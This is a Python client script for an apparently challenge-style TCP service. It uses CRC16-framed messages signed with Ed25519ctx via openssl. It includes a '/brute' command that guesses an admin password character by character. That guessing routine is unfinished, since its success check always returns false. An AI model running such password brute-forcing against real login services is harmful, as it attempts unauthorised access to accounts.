#!/usr/bin/env python3
import socket, struct, threading, subprocess, tempfile
from pathlib import Path
from dataclasses import dataclass
from typing import Optional, Deque
from collections import deque
import hashlib
import base64
import re
import subprocess, tempfile, os
import string

HOST="127.0.0.1"
#HOST="sliceshare.divanodivino.xyz"
PORT=1234

PRIVATE_PEM_PATH="private.pem"
CTX="A protocol defined context string"

# ---- CRC16 (poly 0x3D65, MSB-first, init 0) ----
def crc16_poly_3d65_msb(data: bytes, init: int = 0x0000) -> int:
    crc = init & 0xFFFF
    poly = 0x3D65
    for b in data:
        cur = b & 0xFF
        for _ in range(8):
            crc_msb = 1 if (crc & 0x8000) else 0
            data_msb = 1 if (cur & 0x80) else 0
            crc = (crc << 1) & 0xFFFF
            if (crc_msb ^ data_msb):
                crc ^= poly
            cur = (cur << 1) & 0xFF
    return crc & 0xFFFF

def pack_frame(payload: bytes) -> bytes:
    crc = crc16_poly_3d65_msb(payload)
    return struct.pack(">HH", crc & 0xFFFF, len(payload) & 0xFFFF) + payload

def recv_exact(sock: socket.socket, n: int) -> bytes:
    out = bytearray()
    while len(out) < n:
        chunk = sock.recv(n - len(out))
        if not chunk:
            raise EOFError("connection closed")
        out += chunk
    return bytes(out)

def recv_frame(sock: socket.socket) -> bytes:
    hdr = recv_exact(sock, 4)
    crc, length = struct.unpack(">HH", hdr)
    if length == 0 or length >= 0x1000:
        raise ValueError(f"bad length: {length:#x}")
    payload = recv_exact(sock, length)
    calc = crc16_poly_3d65_msb(payload)
    if calc != crc:
        raise ValueError(f"CRC mismatch: calc={calc:#06x} hdr={crc:#06x}")
    return payload

def send_frame(sock: socket.socket, payload: bytes) -> None:
    if len(payload) >= 0x1000:
        raise ValueError("payload too large (< 0x1000)")
    sock.sendall(pack_frame(payload))

def is_texty(b: bytes) -> bool:
    return all(32 <= x < 127 or x in (9,10,13) for x in b)

CTX = "A protocol defined context string"

# Hacky signing as I didn't get the python libraries to work
def sign_ed25519ctx_with_openssl(priv_pem: str, msg: bytes, ctx: str = CTX) -> bytes:
    with tempfile.TemporaryDirectory() as td:
        msg_path = os.path.join(td, "msg.bin")
        sig_path = os.path.join(td, "sig.bin")
        with open(msg_path, "wb") as f:
            f.write(msg)

        subprocess.check_call([
            "openssl","pkeyutl","-sign","-rawin",
            "-inkey", priv_pem,
            "-in", msg_path,
            "-out", sig_path,
            "-pkeyopt","instance:Ed25519ctx",
            "-pkeyopt", f"context-string:{ctx}",
        ])

        with open(sig_path, "rb") as f:
            return f.read()
 
def login_attempt(sock, username_payload: bytes, password_payload: bytes) -> bool:
    send_signed(sock, b'1')

    # server asks username:
    send_signed(sock, username_payload)

    # server asks password:
    print("Trying: ", password_payload)
    send_signed(sock, password_payload)

    # now server sends signed "Welcome\r\n" or "Invalid credentials\r\n"
    # I was lazy and didn't implement proper response checking as CTRL+F was faster
    return 0

def recover_password(sock, max_len=256) -> bytes:
    username = b"admin\x00"

    known = b""
    alphabet = string.printable[:-6]
    for i in range(max_len):
        found = False
        for ch in alphabet:
            guess = known + ch.encode("ascii")
            ok = login_attempt(sock, username, guess)
            if ok:
                known = guess
                print(f"[+] prefix {len(known)}: {known.hex()}  ({known!r})")
                found = True
                break

        if not found:
            return known
    return known
 
def send_signed(sock: socket.socket, payload: bytes) -> bytes:
    sig = sign_ed25519ctx_with_openssl(PRIVATE_PEM_PATH, payload)
    send_frame(sock, payload)
    send_frame(sock, sig)
    return sig

HELP = """Commands
  /help                 show help
  /quit                 exit

Signed send (TWO frames: msg then sig(msg):
  /signed <text>        send text + signature
  /signedcrlf <text>    send text+\\r\\n + signature
  /signedhex <hex>      send raw bytes + signature


Notes:
- Wire frame is: [CRC16 big-endian][LEN16 big-endian][PAYLOAD]
- Signature is Ed25519ctx with context-string: "A protocol defined context string"
"""

@dataclass
class State:
    last_frames: Deque[bytes]

def rx_loop(sock: socket.socket, st: State, stop: threading.Event):
    while not stop.is_set():
        try:
            payload = recv_frame(sock)
            st.last_frames.append(payload)
            while len(st.last_frames) > 20:
                st.last_frames.popleft()
            if is_texty(payload):
                print(payload.decode("utf-8", errors="replace"))
        except TimeoutError:
            continue
        except EOFError as e:
            print("\n[!] disconnected:", e)
            stop.set()
            return
        except Exception as e:
            print("\n[!] RX error:", e)
            stop.set()
            return

def main():
    # quick checks
    subprocess.run(["openssl","version"], capture_output=True, text=True, check=True)
    Path(PRIVATE_PEM_PATH).read_bytes()

    sock = socket.create_connection((HOST, PORT), timeout=5.0)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(0.5)

    st = State(last_frames=deque())
    stop = threading.Event()
    threading.Thread(target=rx_loop, args=(sock, st, stop), daemon=True).start()

    print(f"[*] Connected to {HOST}:{PORT}\nType /help for commands.\n")

    client_pub = Path("public.pem").read_bytes()
    # ensure newline at end for PEM parsing
    if not client_pub.endswith(b"\n"):
       client_pub += b"\n"
    send_frame(sock, client_pub)
    print(f"[*] sent client public key ({len(client_pub)} bytes)")

    try:
        while not stop.is_set():
            line = input("> ").strip()
            if not line:
                continue
            if line == "/help":
                print(HELP); continue
            if line == "/quit":
                break

            # ---- signed sends ----
            if line.startswith("/signedlf "):
                payload = line.split(" ",1)[1].encode("utf-8") + b"\n"
                sig = send_signed(sock, payload)
                continue
            if line.startswith("/signedhex "):
                hx = line.split(" ",1)[1].replace(" ","")
                payload = bytes.fromhex(hx)
                sig = send_signed(sock, payload)
                continue
            if line.startswith("/brute"):
                recover_password(sock, 1)
                continue
            if line.startswith("/signed "):
                payload = line.split(" ",1)[1].encode("utf-8")
                sig = send_signed(sock, payload)
                continue

            try:
                payload = line.encode("ascii")
            except Exception:
                payload = line.encode("utf-8")
            sig = send_signed(sock, payload)

    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        try: sock.close()
        except Exception: pass
        print("\n[*] closed")

if __name__ == "__main__":
    main()
